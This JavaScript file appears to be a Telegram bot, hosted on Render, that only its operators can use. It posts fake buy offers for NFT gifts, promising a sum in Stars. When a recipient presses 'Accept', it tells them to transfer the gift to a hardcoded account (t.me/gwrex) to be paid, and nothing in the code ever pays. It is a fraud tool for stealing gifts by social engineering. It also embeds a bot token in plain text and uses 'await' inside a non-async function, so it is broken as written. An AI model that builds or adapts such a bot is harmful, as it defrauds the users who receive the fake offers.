const ADMIN_ID = 5151757168; // Ваш ID
const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВАЖНО: Вставь новый токен!

const ALLOWED_IDS = [5151757168];
const ALLOWED_USERNAMES = ["nogannopervi"];

const app = (request) => { // Обертка для Render
  if (request.method !== "POST") {
    // Простой ответ для проверки работоспособности (health check)
    return new Response("OK", { status: 200 });
  }

  try {
    const update = JSON.parse(request.body); // Для Render парсим тело запроса

    // --- /start ---
    if (update.message && update.message.text === "/start") {
      // ... (логика /start осталась без изменений)
      const chatId = update.message.chat.id;
      const userId = update.message.from.id;
      const username = update.message.from.username ? update.message.from.username.toLowerCase() : "";
      const isAdmin = userId === ADMIN_ID;
      const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
      
      let text = "";
      if (!isAdmin && !isAllowed) {
        text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>${userId}</code>`;
      } else {
        text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/PlushPepe-2687 9000 stars</code>`;
      }
      await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
    }

    // --- INLINE (Создание офера) ---
    if (update.inline_query) {
      // ... (логика inline_query осталась без изменений)
      const iq = update.inline_query;
      const userId = iq.from.id;
      const username = iq.from.username ? iq.from.username.toLowerCase() : "";
      const isAdmin = userId === ADMIN_ID;
      const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
      if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

      const textQuery = iq.query.trim();
      const numMatch = textQuery.match(/\d+/); 
      const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); 
      const amount = numMatch ? numMatch[0] : "0";
      const giftId = giftMatch ? giftMatch[0] : "Подарок";
      let senderName = iq.from.first_name || "";
      if (iq.from.last_name) senderName += " " + iq.from.last_name;
      if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
      const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
      const results = [{
        type: "article", id: "1", title: `Оффер от ${senderName}`, description: `За ${amount} ⭐ Stars`,
        input_message_content: { message_text: text, parse_mode: "HTML" },
        reply_markup: { inline_keyboard: [[{ text: "✅ Принять", callback_data: "acc" }], [{ text: "❌ Отклонить", callback_data: "dec" }]] }
      }];
      await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
    }

    // --- КНОПКИ ---
    if (update.callback_query) {
      // ... (логика callback_query осталась без изменений)
      const cq = update.callback_query;
      const chatId = cq.message.chat.id;
      const messageId = cq.message.message_id;
      const hasCaption = !!cq.message.caption;
      const messageText = cq.message.text || cq.message.caption || "";
      const amountMatch = messageText.match(/(\d+)\s*⭐/);
      const amount = amountMatch ? amountMatch[1] : "указанную сумму";

      if (cq.data === "acc") {
        await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐`, show_alert: true });
        try {
          const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐.`;
          const newMarkup = { inline_keyboard: [[{ text: "Передать NFT ↗", url: "https://t.me/gwrex" }]] };
          if (hasCaption) await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
          else await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
        } catch (e) { console.error(e); }
      } 
      else if (cq.data === "dec") {
        await callApi("answerCallbackQuery", { callback_query_id: cq.id });
        try {
          const newText = `× Оффер отклонён.`;
          const emptyMarkup = { inline_keyboard: [] };
          if (hasCaption) await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
          else await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
        } catch (e) { console.error(e); }
      }
    }

    return new Response("OK", { status: 200 });
  } catch (error) {
    console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
    return new Response("Error: " + error.message, { status: 500 });
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    return await response.json();
  } catch (e) {
    console.error("Ошибка Fetch:", e.message);
    throw e;
  }
}

// Экспорт для Render
export default {
  fetch: app
};